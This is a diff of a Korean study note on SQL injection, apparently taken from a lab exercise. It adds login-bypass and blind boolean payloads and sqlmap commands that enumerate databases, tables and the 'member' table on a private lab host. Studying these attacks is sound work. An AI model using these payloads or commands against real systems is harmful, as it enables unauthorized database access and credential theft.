@@ -15,7 +15,7 @@
 ### 예시 ID 값
 
 ```
-'or 1=1--
+' or 1=1--
 ' or 2=2--
 true'or3=3--
 ```
@@ -113,7 +113,7 @@ UNION SELECT 1,2,3,m_id,m_pwd,m_name,NULL,NULL FROM member--
 
 쿼리 결과가 **참/거짓**인지에 따라 정보를 획득하는 공격 기법.
 
-### 1.
+### 5.1
 ```sql
 attacker' and 1=1--   -- 참 구문
 attacker' and 1=2--   -- 거짓 구문
@@ -134,17 +134,18 @@ attacker' and ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0))) AS VARCHAR(20)),6,
 
 ![](../Images/Pasted%20image%2020260730093626.png)
 
-### 2.
+### 5.2
 ```sql
 다른 구문
-
+%' and '1%'='1--
+%' and '1%'='1
 %' and 'a%'='a
 %' and '1%'='1
 ```
 ![](../Images/Pasted%20image%2020260730094602.png)
 
 
-### 3.
+### 5.3
 모든 파라미터를 대상으로 파라미터 취약점을 찾아야함.
 Web URL 파라미터를 통해서 위 값을 공격해볼 수 있다.
 ![](../Images/Pasted%20image%2020260730094926.png)
@@ -153,3 +154,38 @@ Web URL 파라미터를 통해서 위 값을 공격해볼 수 있다.
 - idx=543%' and 'a%'='b 이렇게 거짓 구문 삽입 시 아래와 같은 반응도 볼 수 있다.
 - ![](../Images/Pasted%20image%2020260730095337.png)
 
+
+
+---
+
+## sqlmap.py 
+- sqlmap 자동화 도구
+
+python sqlmap.py -r 1.txt -p keyword
+- keyword는 sql 파라미터 값
+- 1.txt는 keyword 값이 들어있는 텍스트 파일
+- 경로 : 'C:\Users\우하민\AppData\Local\sqlmap\output\192.168.63.132'
+	- 값에 따른 로그가 저장 위치
+
+![](../Images/Pasted%20image%2020260730103118.png)
+> OS, DB 정보를 찾게 되었음.
+
+python sqlmap.py -r 1.txt --dbs --dbms="Microsoft SQL Server 2005" -p keyword(파라미터)
+
+- --dbs : DB의 정보를 알 수 있게 해주는 명령어
+
+출력 결과 >>
+![](../Images/Pasted%20image%2020260730103551.png)
+
+- 공격 대상 순서는 DB -> TABLE -> COLUMN
+-  공격 대상 DB는 `BOARD`
+	- python sqlmap.py -r 1.txt --tables -D board --dbms="Microsoft SQL Server 2005" -p keyword
+
+![](../Images/Pasted%20image%2020260730103906.png)
+
+- 공격 대상 member
+	-  python sqlmap.py -r 1.txt --columns -D board -T member --dbms="Microsoft SQL Server 2005" -p keyword
+
+![](../Images/Pasted%20image%2020260730104121.png)
+
+- 
